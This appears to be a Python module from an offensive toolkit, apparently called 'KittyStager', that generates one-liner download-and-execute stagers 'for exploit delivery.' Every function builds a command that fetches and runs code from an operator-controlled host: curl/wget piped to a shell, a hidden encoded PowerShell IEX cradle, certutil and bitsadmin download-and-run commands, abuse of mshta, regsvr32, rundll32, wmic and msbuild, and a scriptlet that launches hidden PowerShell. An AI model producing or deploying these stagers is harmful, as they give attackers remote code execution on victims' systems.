#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""One-liner download-and-execute stagers for exploit delivery."""

from __future__ import annotations

import base64


def build_curl_pipe_python(stager_url: str, python_binary: str = "python3") -> str:
    """curl -fsSL URL | python3 — minimal Unix download stager."""
    url = _shell_single_quote(str(stager_url or "").strip())
    py = str(python_binary or "python3").strip() or "python3"
    return f"curl -fsSL {url} | {py} -"


def build_wget_pipe_python(stager_url: str, python_binary: str = "python3") -> str:
    """wget -qO- URL | python3"""
    url = _shell_single_quote(str(stager_url or "").strip())
    py = str(python_binary or "python3").strip() or "python3"
    return f"wget -qO- {url} | {py} -"


def build_curl_pipe_bash(stager_url: str) -> str:
    """curl -fsSL URL | bash"""
    url = _shell_single_quote(str(stager_url or "").strip())
    return f"curl -fsSL {url} | bash"


def _shell_single_quote(value: str) -> str:
    return "'" + value.replace("'", "'\"'\"'") + "'"


def build_powershell_iex_download(stager_url: str) -> str:
    """PowerShell DownloadString + IEX (no AMSI bypass — keep payload module responsible)."""
    url = str(stager_url or "").strip().replace("'", "''")
    script = (
        f"$u='{url}';"
        f"IEX (New-Object Net.WebClient).DownloadString($u)"
    )
    encoded = base64.b64encode(script.encode("utf-16le")).decode("ascii")
    return f"powershell -nop -w hidden -EncodedCommand {encoded}"


def build_certutil_download_exec(stager_url: str, dest: str = "%TEMP%\\ks.exe") -> str:
    """certutil download + execute (Windows)."""
    url = str(stager_url or "").strip()
    path = str(dest or "%TEMP%\\ks.exe").strip()
    return (
        f'certutil -urlcache -split -f "{url}" "{path}" '
        f'&& "{path}"'
    )


def build_bitsadmin_download_exec(stager_url: str, dest: str = "%TEMP%\\ks.exe") -> str:
    """bitsadmin download + execute (Windows legacy)."""
    url = str(stager_url or "").strip()
    path = str(dest or "%TEMP%\\ks.exe").strip()
    job = "ksjob"
    return (
        f'bitsadmin /transfer {job} /download /priority high "{url}" "{path}" '
        f'&& "{path}"'
    )


def build_curl_exe_download_exec(stager_url: str, dest: str = "%TEMP%\\ks.exe") -> str:
    """curl.exe download + execute (Windows 10+)."""
    url = str(stager_url or "").strip()
    path = str(dest or "%TEMP%\\ks.exe").strip()
    return f'curl -fsSL -o "{path}" "{url}" && "{path}"'


def build_mshta_remote(stager_url: str) -> str:
    """mshta.exe — fetch and run a remote HTA document."""
    url = str(stager_url or "").strip()
    return f'mshta "{url}"'


def build_regsvr32_sct(stager_url: str) -> str:
    """regsvr32 squiblydoo — execute remote scriptlet (.sct)."""
    url = str(stager_url or "").strip()
    return f'regsvr32 /s /n /u /i:"{url}" scrobj.dll'


def build_rundll32_mshtml(stager_url: str) -> str:
    """rundll32 + mshtml RunHTMLApplication — load remote script (.sct/.js)."""
    url = str(stager_url or "").strip()
    return (
        'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";'
        f'document.write();GetObject("script:{url}")'
    )


def build_wmic_xsl(stager_url: str) -> str:
    """wmic os get /FORMAT — load remote XSL stylesheet (JScript/WSH in XSL)."""
    url = str(stager_url or "").strip()
    return f'wmic os get /FORMAT:"{url}"'


def build_msbuild_remote(stager_url: str) -> str:
    """msbuild.exe — build/run a remote malicious project XML."""
    url = str(stager_url or "").strip()
    return f'msbuild.exe "{url}"'


def build_sct_iex_wrapper(stager_url: str) -> str:
    """Return a .sct scriptlet that PowerShell-IEXs a remote .ps1 stager."""
    url = str(stager_url or "").strip().replace("'", "''")
    run = f'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(' + "'" + url + "'" + ')"'
    run_esc = run.replace("\\", "\\\\").replace('"', '\\"')
    return (
        '<?XML version="1.0"?>\n'
        '<scriptlet>\n'
        '<registration description="KittyStager" progid="KittyStager" '
        'classid="{F0000000-0000-0000-0000-000000000001}">\n'
        '<script language="JScript">\n'
        '<![CDATA[\n'
        f'new ActiveXObject("WScript.Shell").Run("{run_esc}", 0, false);\n'
        ']]>\n'
        '</script>\n'
        '</registration>\n'
        '</scriptlet>\n'
    )


def build_python_urllib_pipe_python(stager_url: str, python_binary: str = "python3") -> str:
    """Python urllib download | exec — no curl/wget required."""
    url = repr(str(stager_url or "").strip())
    py = str(python_binary or "python3").strip() or "python3"
    script = (
        "import urllib.request,sys;"
        f"exec(urllib.request.urlopen({url},timeout=30).read().decode())"
    )
    return f'{py} -c "{script}"'


def build_stager_url(lhost: str, lport: int, path: str = "/stager.py", use_tls: bool = False) -> str:
    """Default operator-side URL hint (run python -m http.server on lport)."""
    host = str(lhost or "127.0.0.1").strip()
    port = int(lport or 8000)
    scheme = "https" if use_tls else "http"
    suffix = path if str(path).startswith("/") else f"/{path}"
    if port in (80, 443) and ((scheme == "http" and port == 80) or (scheme == "https" and port == 443)):
        return f"{scheme}://{host}{suffix}"
    return f"{scheme}://{host}:{port}{suffix}"
